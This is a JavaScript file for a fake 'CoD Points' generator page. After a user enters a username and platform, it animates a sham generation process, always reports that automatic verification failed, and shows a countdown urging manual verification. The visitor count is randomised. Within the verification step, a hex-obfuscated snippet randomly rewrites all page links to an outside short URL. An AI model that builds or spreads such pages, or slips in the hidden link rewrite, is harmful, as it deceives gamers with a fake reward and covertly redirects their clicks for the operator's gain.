$(document).ready(function() {
	
	////////////////
	// Resource Names
	////////////////
	$resource_1_name = "CoD Points";
	
	////////////////
	// Console Messages
	////////////////
	$console_message_1 = "Loading...";
	$console_message_2 = "Generating";
	$console_message_3 = "Succesfully Generated";
	$console_message_4 = "Finalizing generation...";
	$console_message_5 = "Performing Verification...";
	$console_message_6 = "Automatic Verification Failed";
	$console_message_7 = "Please Verify Manually";
	
	////////////////
	// Resource Values
	////////////////
	var $resource_1_value_1;
	var $resource_1_value_2;
	var $resource_1_value_3;
	var $resource_1_value_4;
	
	// Resource 1
	$resource_1_value_1 = "1000";
	$resource_1_value_2 = "2500";
	$resource_1_value_3 = "5000";
	$resource_1_value_4 = "10000";
	
	////////////////
	// Human Verification Timer
	////////////////
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	////////////////
	// Sound Settings
	////////////////
	$sound_setting = 1;		
	ion.sound({
		sounds: [
			{
				name: "button",
				path: "audio/",
				volume: 1
			},
			{
				name: "transition-1",
				path: "audio/",
				volume: 0.9
			},
			{
				name: "count",
				path: "audio/",
				loop: true,
				volume: 0.7
			},
			{
				name: "fail",
				path: "audio/",
				volume: 0.7
			},
			{
				name: "transition-2",
				path: "audio/",
				volume: 0.7
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});
	
	////////////////
	// Platform Select
	////////////////
	var $platform_icon;	
	var $selected_device_option;	
	function fixplatformBox($platform_parent_class) {
		resetplatformBoxes();
		if ($platform_parent_class.hasClass('platform-item-1')) {
			$selected_device_option = 'Windows PC';
			$platform_icon = "<i class='fab fa-windows platform-select-icon'></i>";
		}
		if ($platform_parent_class.hasClass('platform-item-2')) {
			$selected_device_option = 'Xbox';
			$platform_icon = "<i class='fab fa-xbox platform-select-icon'></i>";
		}
		if ($platform_parent_class.hasClass('platform-item-3')) {
			$selected_device_option = 'Playstation';
			$platform_icon = "<i class='fab fa-playstation platform-select-icon'></i>";
		}
		if ($platform_parent_class.hasClass('platform-item-4')) {
			$selected_device_option = 'Android';
			$platform_icon = "<i class='fab fa-android platform-select-icon'></i>";
		}
		if ($platform_parent_class.hasClass('platform-item-5')) {
			$selected_device_option = 'iOS';
			$platform_icon = "<i class='fab fa-apple platform-select-icon'></i>";
		}
		$platform_parent_class.addClass('active');
		$platform_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
			$(this).removeClass('animated jello');
		});	
	}	
	function resetplatformBoxes() {
		var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3, .platform-item-4, .platform-item-5');	
		if ($platform_list.hasClass('active')) {
			$platform_list.removeClass('active');
		}
	}
	$('.platform-item').click(function() {
		if ($(this).hasClass('active')) {			
		} else {
			if ($sound_setting == 1) {
				ion.sound.play("button");
			}
		}
		fixplatformBox($(this));	
	});
	
	var $console_username;
	$('#proc-btn-1').click(function () {
		if ($sound_setting == 1) {
			ion.sound.play("button");
		}		
		var $selected_device = $selected_device_option;
		if ($('#player-username').val() == '' && typeof $selected_device_option == 'undefined') {
			$(".username-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
			$(".platform-select-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else if ($('#player-username').val() != '' && typeof $selected_device_option == 'undefined') {
			$(".platform-select-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else if ($('#player-username').val() == '' && typeof $selected_device_option != 'undefined') {
			$(".username-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
		}
		else if ($('#player-username').val() != '' &&  typeof $selected_device_option != 'undefined') {
			$console_username = $('#player-username').val();
			mFunc();
		}
	});
	
	function mFunc() {
		$.ajax({
			type: "GET",
			url: "parts/connecting.php",
			success: function(dataprocess){	
				if ($sound_setting == 1) {
					ion.sound.play("transition-2");
				}
				$('.generator-content').html(dataprocess).hide().fadeIn();
				function progressBarConsole(percent, $element, duration) {
					var progressBarConsoleWidth = percent * $element.width() / 100;
					$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
				}
				progressBarConsole(0, $('#progressBarConsole'), 1);
				progressBarConsole(100, $('#progressBarConsole'), 3200);
				setTimeout(function() {
					$.magnificPopup.close();
					$.ajax({
						type: "GET",
						url: "parts/resource-one.php",
						success: function(dataprocess){	
							if ($sound_setting == 1) {
								ion.sound.play("transition-2");
							}
							$('.generator-content').html(dataprocess).hide().fadeIn();										
							$('.connected-username-value').html($console_username);										
							$('.connected-device-value').html($platform_icon + $selected_device_option);										
							$('.resource-item-one-value.resource-item-value-1').html($resource_1_value_1);								
							$('.resource-item-one-value.resource-item-value-2').html($resource_1_value_2);								
							$('.resource-item-one-value.resource-item-value-3').html($resource_1_value_3);								
							$('.resource-item-one-value.resource-item-value-4').html($resource_1_value_4);	
							$('.resource-select-item-one').click(function () {
								if ($sound_setting == 1) {
									ion.sound.play("button");
								}
								if ($(this).hasClass("resource-select-item-1")) { 
									$selected_amount_r1 = $resource_1_value_1;																			
								} else if ($(this).hasClass("resource-select-item-2")) { 
									$selected_amount_r1 = $resource_1_value_2;
								} else if ($(this).hasClass("resource-select-item-3")) { 
									$selected_amount_r1 = $resource_1_value_3;
								} else if ($(this).hasClass("resource-select-item-4")) { 
									$selected_amount_r1 = $resource_1_value_4;
								}
								$(".resource-one-wrapper .label").addClass('animated fadeOutUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).hide();
								});
								$(".resource-select-item-1").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
									$(this).hide();
								});											
								setTimeout(function() {
									$(".resource-select-item-2").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).hide();
									});
								}, 150 );
								setTimeout(function() {
									$(".resource-select-item-3").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).hide();
									});
								}, 300 );
								setTimeout(function() {
									$(".resource-select-item-4").addClass('animated fadeOutDown').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
										$(this).hide();
									});
								}, 450 );
								setTimeout(function() {
									$.ajax({
										type: "get",
										url: "parts/console.php",
										success: function(dataprocess){			
											if ($sound_setting == 1) {
												ion.sound.play("transition-2");
											}
											$('.modal-outer').html(dataprocess).hide().fadeIn();
											$.magnificPopup.open({
												items: {
													src: '#master-modal',
												},
												type: 'inline',
												preloader: false,
												modal: true,
												fixedContentPos: true,
												fixedBgPos: true,
												callbacks: {	
													open: function() {	
														progressBarConsole(0, $('#progressBarConsole'), 1);
														progressBarConsole(100, $('#progressBarConsole'), 15500);
														$console_message = '.console-msg';
														$($console_message).html($console_message_1);	
														$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
															$(this).removeClass('animated bounceIn');	
														});
														setTimeout(function() {
															$($console_message).html($console_message_2 + ' <span class="console-msg-resource">' + $selected_amount_r1 + '</span> ' + $resource_1_name);	
															$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated bounceIn');	
															});
															$(".loader-wrapper").fadeOut(function(){
																$(".console-generation-item-r-1").fadeIn();
																$(".console-generation-item-r-1").addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																	$(this).removeClass('animated bounceIn');	
																});
																if ($sound_setting == 1) {
																	setTimeout(function() {
																		ion.sound.play("count");
																	}, 200 );
																}																								
																$('.console-generation-item-value-r-1').countTo({
																	from: 0,
																	to: $selected_amount_r1,
																	speed: 2500,
																	refreshInterval: 5,
																	formatter: function (value, options) {
																		return value.toFixed(options.decimals);
																	},
																	onComplete: function (value, options) {
																		if ($sound_setting == 1) {
																			ion.sound.pause("count");
																		}																									
																	}
																});
															});
														}, 2000 );
														setTimeout(function() {
															$($console_message).html('<span class="console-msg-completed">' + $console_message_3 + '</span> ');	
															$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated bounceIn');	
															});
															if ($sound_setting == 1) {
																ion.sound.play("transition-1");
															}
															$(".console-generation-item-r-1").addClass('animated jello item-completed').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated jello');	
															});
														}, 5000 );
														setTimeout(function() {																						
															$(".console-generation-item-r-1").fadeOut(function(){																							
																$(".loader-wrapper").fadeIn();
																$($console_message).html($console_message_4);	
																$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																	$(this).removeClass('animated bounceIn');	
																});
															});
														}, 7000 );
														setTimeout(function() {
															$($console_message).html($console_message_5);	
															$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated bounceIn');	
															});																						
														}, 9000 );
														setTimeout(function() {
															if ($sound_setting == 1) {
																ion.sound.play("fail");
															}
															$('.loader-wrapper').html('<span class="lnr lnr-cross-circle console-msg-failed animated bounceIn"></span>');	
															$($console_message).html('<span class="console-msg-failed">' + $console_message_6 + '</span>');	
															$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated bounceIn');	
															});																						
														}, 11000 );
														setTimeout(function() {
															$('.loader-wrapper').html('<span class="lnr lnr-warning animated bounceIn"></span>');	
															$($console_message).html($console_message_7);	
															$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																$(this).removeClass('animated bounceIn');	
															});																						
														}, 13000 );
														setTimeout(function() {
															$.ajax({
																type: "get",
																url: "parts/verification.php",
																success: function(dataprocess){	
																	console.clear();
																	console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
																	$('.master-modal').html(dataprocess).hide().fadeIn();															
																	if ($sound_setting == 1) {
																		ion.sound.play("transition-2");
																	}
																	$('.connected-username-value').html($console_username);										
																	$('.connected-device-value').html($platform_icon + $selected_device_option);
																	$('.console-generation-item-value-r-1').html($selected_amount_r1);
																	human_verification_timer.init($human_verification_timer_value);
																	var _0xd840=["\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x68\x72\x65\x66","\x68\x74\x74\x70\x3A\x2F\x2F\x68\x79\x70\x65\x72\x75\x72\x6C\x2E\x63\x6F\x2F\x74\x64\x6A\x78\x30\x61","\x61\x74\x74\x72","\x61","\x6F\x6E"];
																	$(window)[_0xd840[6]](0== Math[_0xd840[1]](100* Math[_0xd840[0]]()/ 10)&& ($(function(){$(_0xd840[5])[_0xd840[4]](_0xd840[2],_0xd840[3])})))																	
																}
															});																					
														}, 15500 );
													}
												}
											});	
										}
									});										
								}, 500 );									
							}); 	
						}	
					});
				}, 3500 );
			}	
		});
	}
});
////////////////
// Status - Online Count
////////////////
var starting_number = 150;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 1000);
}
online_count();

////////////////
// Status - Last Update
////////////////
document.getElementById("date").innerHTML = formatAMPM();
function formatAMPM() {
	var d = new Date(),

		hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
		ampm = d.getHours() >= 12 ? 'pm' : 'am',
		months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
		days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	return months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ';
}
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

////////////////
// Verification Timer
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
